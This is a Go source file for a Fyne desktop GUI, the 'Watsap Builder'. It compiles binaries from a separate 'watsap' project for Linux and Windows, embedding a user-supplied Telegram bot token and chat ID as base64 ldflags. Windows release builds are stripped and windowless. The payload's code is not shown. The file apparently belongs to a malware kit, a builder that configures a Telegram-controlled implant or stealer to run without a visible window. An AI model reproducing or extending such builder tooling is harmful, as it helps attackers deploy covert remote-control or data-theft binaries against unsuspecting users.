package main

import (
	"encoding/base64"
	"log"
	"os"
	"os/exec"
	"strings"
	"sync"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/data/binding"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/widget"
)

func builder(arch string, buildType string, platform string, botToken string, chatID string, output binding.String) {
	var outputText strings.Builder
	var mu sync.Mutex

	updateOutput := func(newText string) {
		mu.Lock()
		defer mu.Unlock()
		outputText.WriteString(newText)
		output.Set(outputText.String())
	}

	updateOutput("Building...\n")

	// Ensure output directory exists
	if err := os.MkdirAll("../dist", 0755); err != nil {
		updateOutput("Failed to create dist directory: " + err.Error() + "\n")
		return
	}

	// Base64 encode variables to match config expectation
	encodedBotToken := base64.StdEncoding.EncodeToString([]byte(botToken))
	encodedChatID := base64.StdEncoding.EncodeToString([]byte(chatID))

	// Common flags
	commonFlags := "-X 'watsap/utils/config.TG_BOT_TOKEN=" + encodedBotToken + "' -X 'watsap/utils/config.TG_CHAT_ID=" + encodedChatID + "'"
	debugFlags := commonFlags
	releaseFlags := commonFlags + " -w -s"
	win_releaseFlags := commonFlags + " -w -s -H=windowsgui"

	buildGo := func(goos, goarch, outFile, flags string) error {
		cmd := exec.Command("go", "build", "-ldflags", flags, "-o", outFile, ".")
		cmd.Dir = "../watsap"
		cmd.Env = append(os.Environ(), "CGO_ENABLED=0", "GOOS="+goos, "GOARCH="+goarch)
		out, err := cmd.CombinedOutput()
		if err != nil {
			updateOutput(string(out) + "\n")
			return err
		}
		updateOutput(string(out) + "\n")
		return nil
	}

	// Build Linux
	if platform == "Linux" || platform == "All" {
		updateOutput("Building for Linux...\n")
		var outFile string
		var flags string
		if buildType == "Release" {
			outFile = "../dist/watsap-linux-" + arch + ".bin"
			flags = releaseFlags
		} else {
			outFile = "../dist/watsap-linux-" + arch + "-debug.bin"
			flags = debugFlags
		}

		err := buildGo("linux", arch, outFile, flags)
		if err != nil {
			updateOutput("Linux build failed: " + err.Error() + "\n")
		} else {
			updateOutput("Linux build successful.\n")
		}
	}

	// Build Windows
	if platform == "Windows" || platform == "All" {
		updateOutput("Building for Windows...\n")
		var outFile string
		var flags string
		if buildType == "Release" {
			outFile = "../dist/watsap-windows-" + arch + ".exe"
			flags = win_releaseFlags
		} else {
			outFile = "../dist/watsap-windows-" + arch + "-debug.exe"
			flags = debugFlags
		}

		err := buildGo("windows", arch, outFile, flags)
		if err != nil {
			updateOutput("Windows build failed: " + err.Error() + "\n")
		} else {
			updateOutput("Windows build successful.\n")
		}
	}

	updateOutput("Build complete!")
}

func main() {
	a := app.New()
	w := a.NewWindow("Watsap Builder")
	w.Resize(fyne.NewSize(600, 480))
	w.SetFixedSize(true)

	title := widget.NewLabel("Watsap Builder")
	title.Alignment = fyne.TextAlignCenter

	// Create about button
	aboutButton := widget.NewButton("About", func() {
		aboutContent := widget.NewRichTextFromMarkdown(`
# Watsap Builder

A GUI application for building Watsap binaries with custom configurations.

## Features
- Cross-platform builds (Linux, Windows)
- Multiple architectures (amd64, 386)
- Build type selection (Release, Debug)
- Real-time build logs

## Requirements
- Go compiler

## Version
1.0.0

Built with ♿ using Fyne
		`)
		aboutContent.Wrapping = fyne.TextWrapWord

		aboutDialog := dialog.NewCustom("About Watsap Builder", "Close", aboutContent, w)
		aboutDialog.Resize(fyne.NewSize(400, 300))
		aboutDialog.Show()
	})
	aboutButton.Resize(fyne.NewSize(60, 30))

	// Create top bar with title and about button
	topBar := container.NewBorder(nil, nil, nil, aboutButton, title)

	arch := "amd64"
	archRadio := widget.NewRadioGroup([]string{"amd64", "386"}, func(s string) {
		arch = s
	})
	archRadio.Horizontal = true
	archRadio.SetSelected("amd64")

	buildType := "Release"
	buildTypeRadio := widget.NewRadioGroup([]string{"Release", "Debug"}, func(s string) {
		buildType = s
	})
	buildTypeRadio.Horizontal = true
	buildTypeRadio.SetSelected("Release")

	platform := "All"
	platformRadio := widget.NewRadioGroup([]string{"All", "Linux", "Windows"}, func(s string) {
		platform = s
	})
	platformRadio.Horizontal = true
	platformRadio.SetSelected("All")

	botTokenEntry := widget.NewPasswordEntry()
	botTokenEntry.SetPlaceHolder("Enter bot token")

	chatIDEntry := widget.NewEntry()
	chatIDEntry.SetPlaceHolder("Enter chat ID")
	logBinding := binding.NewString()
	logBinding.Set("Build logs will appear here.")
	logOutput := widget.NewRichTextFromMarkdown("")
	logOutput.Wrapping = fyne.TextWrapWord

	// Update the log output when binding changes
	logBinding.AddListener(binding.NewDataListener(func() {
		text, _ := logBinding.Get()
		logOutput.ParseMarkdown("```\n" + text + "\n```")
	}))

	logScroll := container.NewVScroll(logOutput)
	logScroll.SetMinSize(fyne.NewSize(0, 200))

	// Create copy button for logs
	copyButton := widget.NewButton("Copy Logs", func() {
		text, _ := logBinding.Get()
		w.Clipboard().SetContent(text)
	})
	copyButton.Resize(fyne.NewSize(80, 30))

	// Create build button
	buildButton := widget.NewButton("Build", func() {
		// Validate required fields
		if strings.TrimSpace(botTokenEntry.Text) == "" {
			dialog.ShowInformation("Error", "Bot Token is required!", w)
			return
		}
		if strings.TrimSpace(chatIDEntry.Text) == "" {
			dialog.ShowInformation("Error", "Chat ID is required!", w)
			return
		}

		go builder(arch, buildType, platform, botTokenEntry.Text, chatIDEntry.Text, logBinding)
	})
	buildButton.Importance = widget.HighImportance

	// Container for buttons
	buttonContainer := container.NewVBox(buildButton, copyButton)

	// Container for logs with buttons
	logsContainer := container.NewBorder(nil, buttonContainer, nil, nil, logScroll)

	form := &widget.Form{
		Items: []*widget.FormItem{
			{Text: "Bot Token", Widget: botTokenEntry},
			{Text: "Chat ID", Widget: chatIDEntry},
			{Text: "Architecture", Widget: archRadio},
			{Text: "Build Type", Widget: buildTypeRadio},
			{Text: "Platform", Widget: platformRadio},
		},
	}

	// Check for dependencies
	go func() {
		_, err := exec.LookPath("go")
		if err != nil {
			log.Println("Go is not installed. Please install it from https://golang.org/dl/")
		}
	}()

	centeredForm := container.NewHBox(layout.NewSpacer(), form, layout.NewSpacer())
	top := container.NewVBox(topBar, centeredForm)

	w.SetContent(container.NewBorder(top, nil, nil, nil, logsContainer))

	w.ShowAndRun()
}
